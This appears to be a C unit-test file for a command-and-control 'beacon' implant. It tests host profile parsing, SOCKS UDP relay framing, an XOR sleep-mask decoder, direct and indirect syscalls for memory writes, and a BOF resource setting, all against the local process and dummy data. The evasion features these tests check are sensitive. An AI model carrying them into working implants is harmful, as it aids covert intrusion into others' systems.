/* 4.7–4.9 remaining beacon features: Host Profiles (75), SOCKS UDP wire,
 * sleep-mask XOR, Direct/Indirect syscalls, setting 74 bof_res KV.
 * Does not link gargle/pivot/boff — decode and packet parse are isolated. */
#include "test_harness.h"
#include <winsock2.h>
#include <Windows.h>
#include <string.h>
#include "beacon.h"
#include "parse.h"
#include "profile.h"
#include "datastore.h"
#include "hostprof.h"
#include "syscalls.h"
#include "udppkt.h"

extern char myargs[];
extern char sleepmask_region[];

static void put_u16(unsigned char * p, unsigned int v) {
	p[0] = (unsigned char)(v >> 8);
	p[1] = (unsigned char)(v & 0xff);
}
static void put_u32(unsigned char * p, unsigned long v) {
	p[0] = (unsigned char)(v >> 24);
	p[1] = (unsigned char)(v >> 16);
	p[2] = (unsigned char)(v >> 8);
	p[3] = (unsigned char)(v & 0xff);
}

static void load_settings_blob(unsigned char * blob, int bloblen) {
	int i;
	int n = bloblen < 4096 ? bloblen : 4096;
	for (i = 0; i < n; i++)
		blob[i] ^= 0x2E;
	memset(myargs, 0, 8192);
	memcpy(myargs, blob, n);
	settings_init(NULL);
}

static unsigned char * hp_pack_field(unsigned char * p, unsigned short type, const char * s) {
	int n = (int)strlen(s) + 1;
	put_u16(p, type);
	put_u16(p + 2, (unsigned)n);
	memcpy(p + 4, s, n);
	return p + 4 + n;
}

TEST(host_profiles_parse_and_apply) {
	unsigned char blob[4096];
	unsigned char hp[1024];
	unsigned char * q;
	profile p;
	char uri[1024], headers[1024], params[1024], stage[1024];

	memset(hp, 0, sizeof(hp));
	q = hp;
	q = hp_pack_field(q, 1, "cdn.example");
	q = hp_pack_field(q, 5, "/pixel.gif");
	q = hp_pack_field(q, 6, "id=42");
	q = hp_pack_field(q, 6, "q=1");
	q = hp_pack_field(q, 7, "X-HP: yes");
	q = hp_pack_field(q, 10, "/submit.php");
	q = hp_pack_field(q, 11, "z=9");
	q = hp_pack_field(q, 12, "X-Post: 1");
	q = hp_pack_field(q, 1, "other.example");
	q = hp_pack_field(q, 5, "/other");
	(void)q;

	memset(blob, 0, sizeof(blob));
	put_u16(blob, SETTING_HOST_PROFILES);
	put_u16(blob + 2, 3);
	put_u16(blob + 4, 1024);
	memcpy(blob + 6, hp, 1024);
	load_settings_blob(blob, 4096);

	CHECK(hostprof_count() == 2);
	CHECK(hostprof_host_at(0) != NULL && strcmp(hostprof_host_at(0), "cdn.example") == 0);
	CHECK(hostprof_get_uri_at(0) != NULL && strcmp(hostprof_get_uri_at(0), "/pixel.gif") == 0);
	CHECK(hostprof_post_uri_at(0) != NULL && strcmp(hostprof_post_uri_at(0), "/submit.php") == 0);
	CHECK(hostprof_host_at(1) != NULL && strcmp(hostprof_host_at(1), "other.example") == 0);

	memset(&p, 0, sizeof(p));
	memset(uri, 0, sizeof(uri));
	memset(headers, 0, sizeof(headers));
	memset(params, 0, sizeof(params));
	memset(stage, 0, sizeof(stage));
	p.uri = uri;
	p.headers = headers;
	p.parameters = params;
	p.stage = stage;

	hostprof_apply("cdn.example", &p, 0);
	CHECK(strcmp(uri, "/pixel.gif") == 0);
	CHECK(strstr(params, "?id=42") == params);
	CHECK(strstr(params, "&q=1") != NULL);
	CHECK(strstr(headers, "X-HP: yes") != NULL);

	memset(uri, 0, sizeof(uri));
	memset(headers, 0, sizeof(headers));
	memset(params, 0, sizeof(params));
	hostprof_apply("cdn.example", &p, 1);
	CHECK(strcmp(uri, "/submit.php") == 0);
	CHECK(strstr(params, "?z=9") == params);
	CHECK(strstr(headers, "X-Post: 1") != NULL);

	memset(uri, 0, sizeof(uri));
	memcpy(uri, "/unchanged", 11);
	hostprof_apply("no.such.host", &p, 0);
	CHECK(strcmp(uri, "/unchanged") == 0);
}

TEST(host_profiles_empty_is_noop) {
	unsigned char blob[4096];
	memset(blob, 0, sizeof(blob));
	for (int i = 0; i < 4096; i++) blob[i] ^= 0x2E;
	memset(myargs, 0, 8192);
	memcpy(myargs, blob, 4096);
	settings_init(NULL);
	CHECK(hostprof_count() == 0);
	CHECK(hostprof_host_at(0) == NULL);
}

TEST(socks_udp_connect_and_send_wire) {
	unsigned char conn[32];
	unsigned char sendbuf[64];
	unsigned int id = 0;
	unsigned short port = 0;
	char host[64];
	char * data = NULL;
	int dlen = 0;
	const char * h = "1.2.3.4";
	const char payload[] = "ping";

	memset(conn, 0, sizeof(conn));
	put_u32(conn, 0x11223344);
	put_u16(conn + 4, 53);
	memcpy(conn + 6, h, strlen(h));
	CHECK(socks_udp_parse_connect((char *)conn, 6 + (int)strlen(h), &id, &port, host, (int)sizeof(host)));
	CHECK(id == 0x11223344u);
	CHECK(port == 53);
	CHECK(strcmp(host, "1.2.3.4") == 0);

	memset(sendbuf, 0, sizeof(sendbuf));
	put_u32(sendbuf, 0x11223344);
	put_u16(sendbuf + 4, 53);
	put_u32(sendbuf + 6, (unsigned long)strlen(h));
	memcpy(sendbuf + 10, h, strlen(h));
	memcpy(sendbuf + 10 + strlen(h), payload, sizeof(payload) - 1);
	CHECK(socks_udp_parse_send((char *)sendbuf, 10 + (int)strlen(h) + (int)(sizeof(payload) - 1),
		&id, &port, host, (int)sizeof(host), &data, &dlen));
	CHECK(id == 0x11223344u);
	CHECK(port == 53);
	CHECK(strcmp(host, "1.2.3.4") == 0);
	CHECK(dlen == (int)(sizeof(payload) - 1));
	CHECK(memcmp(data, payload, sizeof(payload) - 1) == 0);

	CHECK(!socks_udp_parse_connect((char *)conn, 5, &id, &port, host, (int)sizeof(host)));
	CHECK(!socks_udp_parse_send((char *)sendbuf, 9, &id, &port, host, (int)sizeof(host), &data, &dlen));
}

TEST(sleepmask_xor_roundtrip_and_unpatched) {
	char inner[64];
	char out[128];
	unsigned char key[4] = { 7, 11, 13, 17 };
	unsigned int ilen;
	unsigned int i;
	char saved[16416];
	int n;

	memcpy(saved, sleepmask_region, 16416);

	memset(inner, 0, sizeof(inner));
	put_u32((unsigned char *)inner, 0);          /* bss */
	put_u32((unsigned char *)inner + 4, 0);      /* code */
	put_u32((unsigned char *)inner + 8, 0);      /* rdata */
	put_u32((unsigned char *)inner + 12, 0);     /* data */
	put_u32((unsigned char *)inner + 16, 0);     /* xdata */
	put_u32((unsigned char *)inner + 20, 0);     /* pdata */
	put_u32((unsigned char *)inner + 24, 0);     /* relocs */
	put_u32((unsigned char *)inner + 28, 0x20);  /* entry */
	put_u32((unsigned char *)inner + 32, 0);     /* empty args */
	ilen = 36;

	memset(sleepmask_region, 0, 16416);
	memcpy(sleepmask_region, key, 4);
	put_u32((unsigned char *)sleepmask_region + 4, ilen);
	memcpy(sleepmask_region + 8, inner, ilen);
	for (i = 0; i < ilen; i++)
		sleepmask_region[8 + i] = (char)(sleepmask_region[8 + i] ^ key[i % 4]);

	n = sleepmask_decode(out, (int)sizeof(out));
	CHECK(n == (int)ilen);
	CHECK(memcmp(out, inner, ilen) == 0);

	memcpy(sleepmask_region, "SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK", 32);
	CHECK(sleepmask_decode(out, (int)sizeof(out)) == 0);

	memcpy(sleepmask_region, saved, 16416);
}

TEST(bof_res_setting_74_kv) {
	unsigned char blob[4096];
	const char * res = "bof-resource-blob";
	int rlen = (int)strlen(res) + 1;

	memset(blob, 0, sizeof(blob));
	put_u16(blob, SETTING_BOF_RESOURCE);
	put_u16(blob + 2, 3);
	put_u16(blob + 4, (unsigned)rlen);
	memcpy(blob + 6, res, rlen);
	load_settings_blob(blob, 4096);

	CHECK(BeaconGetValue("bof_res") != NULL);
	CHECK(strcmp((char *)BeaconGetValue("bof_res"), "bof-resource-blob") == 0);

	memset(blob, 0, sizeof(blob));
	for (int i = 0; i < 4096; i++) blob[i] ^= 0x2E;
	memset(myargs, 0, 8192);
	memcpy(myargs, blob, 4096);
	settings_init(NULL);
	CHECK(BeaconGetValue("bof_res") == NULL);
}

TEST(syscall_ssn_and_direct_indirect_wpm) {
	char src[16];
	char dst[16];
	SIZE_T wrote = 0;
	SIZE_T got = 0;

	syscalls_resolve();
#if defined(_M_X64)
	CHECK(syscalls_ssn_ntwrite() != 0);
#else
	CHECK(syscalls_ssn_ntwrite() == 0);
#endif

	memcpy(src, "syscall-wpm", 12);

	syscall_method_set(0);
	memset(dst, 0, sizeof(dst));
	CHECK(beacon_WriteProcessMemory(GetCurrentProcess(), dst, src, 12, &wrote));
	CHECK(wrote == 12);
	CHECK(memcmp(dst, src, 12) == 0);

	syscall_method_set(1);
	memset(dst, 0, sizeof(dst));
	wrote = 0;
	CHECK(beacon_WriteProcessMemory(GetCurrentProcess(), dst, src, 12, &wrote));
	CHECK(memcmp(dst, src, 12) == 0);
	memset(src, 0, sizeof(src));
	CHECK(beacon_ReadProcessMemory(GetCurrentProcess(), dst, src, 12, &got));
	CHECK(memcmp(src, "syscall-wpm", 12) == 0);

	syscall_method_set(2);
	memcpy(src, "indirect-sc", 12);
	memset(dst, 0, sizeof(dst));
	CHECK(beacon_WriteProcessMemory(GetCurrentProcess(), dst, src, 12, &wrote));
	CHECK(memcmp(dst, src, 12) == 0);

	syscall_method_set(0);
}
